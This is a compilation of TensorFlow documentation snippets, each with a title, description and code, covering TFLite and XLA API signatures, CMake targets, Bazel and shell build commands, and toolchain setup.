SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
convert_examples_to_features(
    examples, tfrecord_file, label_names
)
```

----------------------------------------

TITLE: Downloading ARMv7 Toolchain (sh)
DESCRIPTION: These commands download the specified ARM GNU toolchain for ARMv7 targets from Google Storage, create a target directory under the user's home folder, and extract the toolchain archives, preparing it for cross-compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_4

LANGUAGE: sh
CODE:
```
curl -LO https://storage.googleapis.com/mirror.tensorflow.org/developer.arm.com/media/Files/downloads/gnu-a/8.3-2019.03/binrel/gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf.tar.xz
mkdir -p ${HOME}/toolchains
tar xvf gcc-arm-8.3-2019.03-x86_64-arm-linux-gnueabihf.tar.xz -C ${HOME}/toolchains
```

----------------------------------------

TITLE: Parallel Bazel Build Analysis TF CPU (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel with specific settings for TensorFlow CPU targets. It includes extensive tag filtering to exclude certain tests/builds (GPU, TPU, etc.), uses CPU-specific release and RBE configurations, enables PYWRAP rules, configures output and profiling. The `--nobuild` flag means it checks dependencies and configuration but doesn't perform the actual compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_8

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-gpu --test_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-gpu --config=release_cpu_linux --config=rbe_linux_cpu --repo_env=USE_PYWRAP_RULES=True --verbose_failures --test_output=errors --profile=profile.json.gz --test_lang_filters=cc,py --color=yes --nobuild -- //tensorflow/compiler/... -//tensorflow/compiler/tf2tensorrt/... //tensorflow/python/... -//tensorflow/python/distribute/... -//tensorflow/python/kernel_tests/... -//tensorflow/python/data/... -//tensorflow/python/compiler/tensorrt/...
```

----------------------------------------

TITLE: Checking GPU Delegate Availability (Conceptual)
DESCRIPTION: Use this method to asynchronously check if the device supports the TFLite GPU delegate. The result can be used to determine whether to enable GPU acceleration or fall back to CPU/NNAPI.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_13

LANGUAGE: Conceptual
CODE:
```
useGpuTask = TfLiteGpu.isGpuDelegateAvailable(context)
```

----------------------------------------

TITLE: Calling TensorMetadataAddStats Python Function
DESCRIPTION: This snippet demonstrates the function call signature for `TensorMetadataAddStats` in the TensorFlow Lite Support Python library. It takes a FlatBuffer builder instance and the stats data to be added, typically used during the construction of tensor metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddStats.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddStats(
    builder, stats
)
```

----------------------------------------

TITLE: Initializing ClassificationResult in Python
DESCRIPTION: This code snippet shows the constructor signature for the `ClassificationResult` class. It requires a list of `Classifications` objects, each representing results from a single classifier head. This list is stored in the `classifications` attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ClassificationResult.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.ClassificationResult(\n    classifications: List[<a href=\"../../../tflite_support/task/processor/Classifications\"><code>tflite_support.task.processor.Classifications</code></a>]\n)
```

----------------------------------------

TITLE: Building TFLite Project with GPU Delegate for Android using Bazel
DESCRIPTION: This shell command shows the Bazel build configuration specifically for compiling a project utilizing the TFLite GPU delegate targeting the Android ARM64 architecture. The `--config android_arm64` flag enables the necessary build settings for Android with GPU support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/gpu/README.md#_snippet_1

LANGUAGE: shell
CODE:
```
bazel build --config android_arm64 //path/to/your:project
```

----------------------------------------

TITLE: AutoGraph Conversion of Compound Symbol Conditional - TensorFlow Python
DESCRIPTION: The AutoGraph-transformed version of the Python `if` statement operating on a compound symbol (`a.b`), where `a.b` is a `tf.Tensor`. The conditional assignment is converted into a `tf.cond` operation, handling the property access within the graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_7

LANGUAGE: Python
CODE:
```
a.b = tf.cond(a.b < 0, lambda: -a.b, lambda: a.b)
```

----------------------------------------

TITLE: Enabling XLA Auto-clustering on GPU Shell
DESCRIPTION: Shell command to enable XLA auto-clustering specifically for GPU workloads in a TensorFlow program. Setting the `TF_XLA_FLAGS` environment variable with `--tf_xla_auto_jit=2` triggers automatic identification and compilation of eligible subgraphs within `tf.function`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_7

LANGUAGE: Shell
CODE:
```
$ TF_XLA_FLAGS=--tf_xla_auto_jit=2 path/to/your/tf/program
```

----------------------------------------

TITLE: Run Lightweight hlo-opt for Pass Development (Bazel)
DESCRIPTION: This command executes a light-weight version of the `hlo-opt` tool using Bazel, specifically intended for developing and testing hardware-independent HLO passes with fewer dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_12

LANGUAGE: Bazel
CODE:
```
bazel run //xla/hlo/tools:hlo-opt -- [flags] <filename>
```

----------------------------------------

TITLE: Creating BertQuestionAnswerer From Options - Python
DESCRIPTION: This class method creates an instance of `BertQuestionAnswerer` using a `BertQuestionAnswererOptions` object. It returns the initialized `BertQuestionAnswerer` object or raises `ValueError`/`RuntimeError` if the options are invalid or other errors occur.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswerer.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.text.BertQuestionAnswererOptions
) -> 'BertQuestionAnswerer'
```

----------------------------------------

TITLE: Create ImageSegmenter from File - Python
DESCRIPTION: A class method to create an `ImageSegmenter` instance directly from a TensorFlow Lite model file path. This simplifies instantiation by handling the necessary options configuration internally. It returns a new `ImageSegmenter` object or raises `ValueError`/`RuntimeError` on failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenter.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'ImageSegmenter'
```

----------------------------------------

TITLE: Create and Enter TFLite Build Directory
DESCRIPTION: Creates a new directory named 'tflite_build' at the current location and then navigates into it. This directory will serve as the workspace where CMake generates build files and where the compiled TensorFlow Lite library and tools will be placed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_2

LANGUAGE: sh
CODE:
```
mkdir tflite_build
cd tflite_build
```

----------------------------------------

TITLE: Set Podspec Source to Local Framework File (Podspec)
DESCRIPTION: Configures the `s.source` attribute in a private CocoaPods podspec to point to a local zip file containing the built framework, allowing CocoaPods to fetch the framework from the filesystem.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_11

LANGUAGE: Ruby
CODE:
```
# Note the `///`, two from the `file://` and one from the `/path`.
s.source       = { :http => "file:///path/to/TensorFlowLiteC_framework.zip" }
```

----------------------------------------

TITLE: Input Example: TF Executor Island (TPU V1 Outlining)
DESCRIPTION: This MLIR snippet shows a function with a `tf_executor.graph` containing a `tf_executor.island`. This structure represents the input before applying the `-tf-executor-tpu-v1-island-outlining` pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_21

LANGUAGE: MLIR
CODE:
```
  func @test() -> tensor<i32> {
    %0 = tf_executor.graph {
      %output, %control = tf_executor.island {
        ...
        tf_executor.yield %result : tensor<i32>
      }
      tf_executor.fetch %output : tensor<i32>
    }
    return %0
  }
```

----------------------------------------

TITLE: Check Raw Image Tensor Shape Python
DESCRIPTION: This snippet simply prints the shape of the `raw_image_tensor`. This tensor represents the test image's pixel data as a TensorFlow tensor before any pre-processing, showing its dimensions (height, width, channels).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
raw_image_tensor.shape
```

----------------------------------------

TITLE: Comparing ModelHParams Inequality - Python
DESCRIPTION: Checks if this `ModelHParams` instance is not equal to another object. This method is typically generated automatically by attribute libraries like `attrs` for comparing parameter sets based on their attribute values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_6

LANGUAGE: Python
CODE:
```
__ne__(
    other
)
```

----------------------------------------

TITLE: Adding Kernel Tests with External Main in CMake
DESCRIPTION: Iterates through a CMake list variable `TEST_WITH_EXTERNAL_MAIN_LIST`, adding a kernel test target for each source file. These tests require an external `main` function provided elsewhere, often for integration testing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
foreach(test_src IN LISTS TEST_WITH_EXTERNAL_MAIN_LIST)
  add_kernel_test(${test_src} tensorflow-lite-test-external-main)
endforeach()
```

----------------------------------------

TITLE: Packing NormalizationOptionsT into Builder Python
DESCRIPTION: Packs the current `NormalizationOptionsT` object's data into a flatbuffer builder (`builder`). This instance method serializes the object's state into the builder, preparing it for finalization into a flatbuffer buffer. It requires an initialized flatbuffer builder object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Running x86 Benchmarks with Bazel - Shell
DESCRIPTION: Shows the shell command to build and run the C++ benchmarks for a specific operation on an x86 platform using Bazel. It uses the `bazel run` command with optimized mode and disabled dynamic linking.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_8

LANGUAGE: Shell
CODE:
```
bazel run -c opt --dynamic_mode=off ops:op_name_bench
```

----------------------------------------

TITLE: Specify Include Directories (CMake)
DESCRIPTION: Sets the include directories for the 'tf_xla_runtime_objects' target. The 'PRIVATE' keyword means these include directories are only used when compiling the sources of this target itself. It adds the '../include' directory to the include path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
target_include_directories(tf_xla_runtime_objects PRIVATE ../include)
```

----------------------------------------

TITLE: Decoding Predictions to Text Python
DESCRIPTION: This code decodes the input character indices and the sampled prediction indices back into text strings using a lookup table (`idx2char`) and prints them for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_27

LANGUAGE: python
CODE:
```
print("Input: \n", repr("".join(idx2char[input_example_batch[0]])))
print()
print("Next Char Predictions: \n", repr("".join(idx2char[sampled_indices ])))
```

----------------------------------------

TITLE: Adding Public GPU MLIR TableGen Build Target - CMake
DESCRIPTION: Creates a CMake build target named `LMHLOGPUTransformsPassIncGen` that depends on the output of the GPU-specific `mlir_tablegen` command, making the generated GPU pass declarations available publicly within the build system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(LMHLOGPUTransformsPassIncGen)
```

----------------------------------------

TITLE: Measure hlo-opt Pass Runtime
DESCRIPTION: This command uses the `time` utility to measure the execution time of applying specific HLO passes (`reduce-window-rewriter`, `scatter_simplifier`) with `hlo-opt`, including setting pass-specific flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_19

LANGUAGE: Bash
CODE:
```
time hlo-opt --passes=reduce-window-rewriter,scatter_simplifier
--xla_reduce_window_rewrite_base_length=128 input.hlo
```

----------------------------------------

TITLE: Pushing Ground Truth Labels to Android via ADB Shell
DESCRIPTION: This ADB command pushes the generated ground truth labels file (`${VALIDATION_LABELS}` on the host, typically created by the Python script) to the temporary directory (`/data/local/tmp/ilsvrc_validation_labels.txt`) on the Android device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_6

LANGUAGE: Shell
CODE:
```
adb push ${VALIDATION_LABELS} /data/local/tmp/ilsvrc_validation_labels.txt
```

----------------------------------------

TITLE: Comparing ModelHParams Less Than or Equal To - Python
DESCRIPTION: Performs a less than or equal to comparison between this `ModelHParams` instance and another object. This method is typically generated automatically by attribute libraries like `attrs` for ordered comparisons.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_4

LANGUAGE: Python
CODE:
```
__le__(
    other
)
```

----------------------------------------

TITLE: Checking Equality TFLite DetectionResult (Python)
DESCRIPTION: Documents the '__eq__' method for the DetectionResult class. This method compares the current object with another object ('other') and returns 'True' if they are considered equal, 'False' otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/DetectionResult.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Formatting C/C++ File with clang-format Bash
DESCRIPTION: Shows how to use `clang-format` to apply the Google C++ style guide to a specified C/C++ file. The formatted output is redirected to a temporary file (`/tmp/my_cc_file.cc`) for comparison. Requires `clang-format` to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_1

LANGUAGE: Bash
CODE:
```
clang-format <my_cc_file> --style=google > /tmp/my_cc_file.cc
```

----------------------------------------

TITLE: Creating TensorImage from NumPy array (Python)
DESCRIPTION: Creates a TensorImage object directly from a NumPy array. The array must be of `uint8` dtype and have specific valid shapes corresponding to RGB, GRAYSCALE, or RGBA formats, otherwise, a ValueError is raised.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/TensorImage.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_array(
    array: np.ndarray
) -> 'TensorImage'
```

----------------------------------------

TITLE: Setting GPU MLIR TableGen Target Definition - CMake
DESCRIPTION: Sets the CMake variable `LLVM_TARGET_DEFINITIONS` to specify the input TableGen definition file specific to GPU passes (`gpu_passes.td`). This file is used by the subsequent `mlir_tablegen` call for GPU-related declarations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS gpu_passes.td)
```

----------------------------------------

TITLE: Run run_hlo_module on Multiple Files
DESCRIPTION: This command executes `run_hlo_module` using Bazel, processing multiple HLO files found within a specified directory pattern. It is useful for batch processing or verifying all HLO dumps from a run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_3

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools:run_hlo_module -- [flags] /dump/*before_optimizations*
```

----------------------------------------

TITLE: Define Object Library (CMake)
DESCRIPTION: Creates an object library named 'tf_xla_runtime_objects'. Object libraries are collections of object files ('.o') that can be used to build other targets. It includes all source files listed in the 'TF_RUNTIME_SRC' variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_library(tf_xla_runtime_objects OBJECT
	${TF_RUNTIME_SRC}
)
```

----------------------------------------

TITLE: Install TFLite Model Maker from Source Shell
DESCRIPTION: These shell commands clone the TensorFlow examples repository and then install the TensorFlow Lite Model Maker package in editable mode from the local source code. This is useful for development or testing purposes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/index.md#_snippet_3

LANGUAGE: shell
CODE:
```
git clone https://github.com/tensorflow/examples
cd examples/tensorflow_examples/lite/model_maker/pip_package
pip install -e .
```

----------------------------------------

TITLE: Configuring Task API ObjectDetector with BaseOptions (Kotlin)
DESCRIPTION: Configure a specific Task API model's options, such as `ObjectDetectorOptions`, by setting the previously created `BaseOptions` that have GPU support enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_23

LANGUAGE: Kotlin
CODE:
```
val options =
            ObjectDetectorOptions.builder()
                .setBaseOptions(baseOptions)
                .setMaxResults(1)
                .build()
```

----------------------------------------

TITLE: Asserting TensorFlow Lite Micro Invoke Status (C++)
DESCRIPTION: Uses `TF_LITE_MICRO_EXPECT_EQ` to assert that the status returned by `interpreter.Invoke()` is `kTfLiteOk`, indicating successful execution of the inference. This is typically used in test contexts.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_15

LANGUAGE: C++
CODE:
```
TF_LITE_MICRO_EXPECT_EQ(kTfLiteOk, invoke_status);
```

----------------------------------------

TITLE: Installing pylint for Python Bash
DESCRIPTION: Provides the command to install the `pylint` Python static analysis tool using pip. `pylint` is utilized to check Python code for errors, enforce a coding standard, and identify potential code smells. Requires pip to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_3

LANGUAGE: Bash
CODE:
```
pip install pylint
```

----------------------------------------

TITLE: Starting a Data Vector in TFLite Custom Metadata - Python
DESCRIPTION: This function initializes a data vector using a FlatBuffers builder object, specifying the number of elements it will contain. It is typically called as part of the process to construct custom metadata for a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataStartDataVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.CustomMetadataStartDataVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Adding Author to Model Metadata in Python
DESCRIPTION: Helper function to add the author offset to the model metadata using a FlatBuffers builder. It takes the FlatBuffers builder instance and the offset of the author string as input, appending the author information to the FlatBuffer structure being built.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddAuthor.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddAuthor(
    builder, author
)
```

----------------------------------------

TITLE: Initializing NLClassifierOptions - TFLite Support - Python
DESCRIPTION: Defines the constructor for the `NLClassifierOptions` class. It requires a `base_options` object of type `tflite_support.task.core.BaseOptions`. This object contains core configuration like model paths or file handles necessary for the task.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifierOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.NLClassifierOptions(
    base_options: tflite_support.task.core.BaseOptions
)
```

----------------------------------------

TITLE: Finding Protobuf Package CMake
DESCRIPTION: Locates the required Protobuf package in the system, setting CMake variables like `Protobuf_PROTOC_EXECUTABLE` needed to run the compiler. The `REQUIRED` keyword ensures the build process will fail if the package is not found, indicating a necessary dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/profiling/proto/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
find_package(Protobuf REQUIRED)
```

----------------------------------------

TITLE: Generating MHLO Pass Declarations (CMake)
DESCRIPTION: Uses the MLIR tablegen tool to generate pass declarations from the mhlo_passes.td file. The output is written to mhlo_passes.h.inc and generates declarations for passes named AllMhlo.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
mlir_tablegen(mhlo_passes.h.inc -gen-pass-decls -name AllMhlo)
```

----------------------------------------

TITLE: Initializing NormalizationOptionsT Class Python
DESCRIPTION: Initializes a new instance of the `NormalizationOptionsT` class. This method serves as the constructor for the class representation used in the flatbuffer metadata schema. It typically creates an empty object that can be populated later.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsT()
```

----------------------------------------

TITLE: Initializing MetadataWriter for TFLite Bert NL Classifier - Python
DESCRIPTION: This is the constructor for the `MetadataWriter` class. It initializes the object with the TFLite model buffer, an optional metadata buffer, and an optional list of paths to associated files. These inputs are used to prepare the writer for adding or updating metadata within the specified Bert Natural Language Classifier model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.bert_nl_classifier.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Executing Build Script Entry Point (Shell)
DESCRIPTION: This shell command is the primary entry point called by the GitHub actions. It invokes the `build.py` script, passing a specific `build_name` argument to define the set of build and test commands to execute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_0

LANGUAGE: Shell
CODE:
```
build.py --build="build_name"
```

----------------------------------------

TITLE: Getting Custom Metadata Count in Python
DESCRIPTION: Retrieves the number of entries in the custom metadata list. This method returns the size of the custom metadata array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_5

LANGUAGE: python
CODE:
```
CustomMetadataLength()
```

----------------------------------------

TITLE: Initializing DataLoader Python
DESCRIPTION: Shows the signature for initializing the `tflite_model_maker.audio_classifier.DataLoader` class. Requires a `tf.data.Dataset` (`dataset`), the dataset size (`size`), a mapping from index to label (`index_to_label`), a specification for processing (`spec`), and an optional boolean for caching (`cache`). Used to create an instance for loading and processing audio data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.audio_classifier.DataLoader(
    dataset, size, index_to_label, spec, cache=False
)
```

----------------------------------------

TITLE: Testing Dense Tensor Op with Integers (Python)
DESCRIPTION: This Python test case validates the 'multiplex_2_op.multiplex' function when applied to dense integer tensors. It creates dense tensors for 'a', 'b', and 'cond', evaluates the op in both graph and eager modes, and compares the result against the expected output obtained using 'np.where', confirming that the op correctly handles the dense tensor case, which should use the original 'multiplex_2_kernel'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_8

LANGUAGE: Python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_int(self):
    a = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    b = tf.constant([10, 20, 30, 40, 50], dtype=tf.int64)
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    expect = np.where(self.evaluate(cond), self.evaluate(a), self.evaluate(b))
    # expected result is [1, 20, 3, 40, 5]
    result = multiplex_2_op.multiplex(cond, a, b)
    self.assertAllEqual(result, expect)
```

----------------------------------------

TITLE: Retrieving Recorded Associated File List from Metadata - Python
DESCRIPTION: This method retrieves a list of associated files explicitly recorded in the metadata of the TensorFlow Lite model. These files can be attached at the model, subgraph, or tensor level, and this method provides a comprehensive list from the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_5

LANGUAGE: Python
CODE:
```
get_recorded_associated_file_list()
```

----------------------------------------

TITLE: Using Python Splitter Class
DESCRIPTION: Demonstrates the basic workflow for using a Python `Splitter` implementation, including instantiating the splitter with a proto, writing the resulting chunks to a file, and accessing the generated chunks and the chunked message object directly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/README.md#_snippet_0

LANGUAGE: python
CODE:
```
splitter = MySplitterClass(proto)

# Export the chunks to a file.
splitter.write(file_prefix)

# Access the chunks created in the splitter.
chunks, chunked_message = splitter.split()
```

----------------------------------------

TITLE: Pushing ImageNet Images to Android via ADB Shell
DESCRIPTION: This sequence of ADB commands first creates a directory (`/data/local/tmp/ilsvrc_images`) on the Android device and then pushes the directory containing the ILSVRC images (`${IMAGENET_IMAGES_DIR}` on the host) into it. Ensure sufficient storage is available on the device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification/README.md#_snippet_5

LANGUAGE: Shell
CODE:
```
adb shell mkdir /data/local/tmp/ilsvrc_images && \
adb push ${IMAGENET_IMAGES_DIR} /data/local/tmp/ilsvrc_images
```

----------------------------------------

TITLE: Implementing PJRT_Client_Create C++
DESCRIPTION: Provides sample pseudocode for implementing the PJRT_Client_Create function when using the C++ PJRT client wrapper. It shows how to get a C++ PJRT client and wrap it using `pjrt::CreateWrapperClient` to satisfy the C API interface.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_0

LANGUAGE: C++
CODE:
```
#include "third_party/tensorflow/compiler/xla/pjrt/c/pjrt_c_api_wrapper_impl.h"

namespace my_plugin {
PJRT_Error* PJRT_Client_Create(PJRT_Client_Create_Args* args) {
  std::unique_ptr<xla::PjRtClient> client = GetPluginPjRtClient();
  args->client = pjrt::CreateWrapperClient(std::move(client));
  return nullptr;
}
}  // namespace my_plugin
```

----------------------------------------

TITLE: Identify High RMSE Layers Pandas
DESCRIPTION: Filters the `layer_stats` pandas DataFrame to identify layers where the 'rmse/scale' metric is greater than 0.7. This helps pinpoint specific layers that may be causing significant quantization errors and are candidates for selective quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_13

LANGUAGE: Python
CODE:
```
layer_stats[layer_stats['rmse/scale'] > 0.7][[
    'op_name', 'range', 'rmse/scale', 'tensor_name'
]]
```

----------------------------------------

TITLE: Initializing TensorMd Python
DESCRIPTION: Initializes a TensorMd object with various attributes defining the tensor's metadata, such as name, description, per-channel min/max values, content type, and associated files. It requires optional arguments for these attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/TensorMd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.metadata_info.TensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    min_values: Optional[List[float]] = None,
    max_values: Optional[List[float]] = None,
    content_type: <a href="../../../tflite_support/metadata_schema_py_generated/ContentProperties"><code>tflite_support.metadata_schema_py_generated.ContentProperties</code></a> = _metadata_fb.ContentProperties.FeatureProperties,
    associated_files: Optional[List[Type[AssociatedFileMd]]] = None,
    tensor_name: Optional[str] = None
)
```

----------------------------------------

TITLE: Building TFLite Micro Project Binary with Make | bash
DESCRIPTION: Compiles and links a runnable binary for a specified project or example application. Replace `<project_name>` with the name of the project target defined in its corresponding Makefile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_3

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile <project_name>_bin
```

----------------------------------------

TITLE: Finding Protobuf Dependency CMake
DESCRIPTION: Locates the Protobuf package using CMake's `find_package`. The `REQUIRED` keyword ensures that the build fails if Protobuf is not found. This step is a prerequisite for compiling the Protobuf definitions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
if (NOT TARGET protobuf::libprotobuf)
  find_package(Protobuf REQUIRED)
endif()
```

----------------------------------------

TITLE: Getting Root As TensorGroup (Deprecated) | TensorFlow Lite Support Python
DESCRIPTION: Deprecated class method to initialize a `TensorGroup` object from a buffer. It takes the buffer and an optional offset. Users should switch to using the `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsTensorGroup(
 buf, offset=0
)
```

----------------------------------------

TITLE: Building Android Arm64 Binary with Bazel - Shell
DESCRIPTION: Gives the shell command to build an Android Arm64 binary for C++ tests using Bazel. It specifies the target configuration and a compiler option for command-line flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/shlo/README.md#_snippet_9

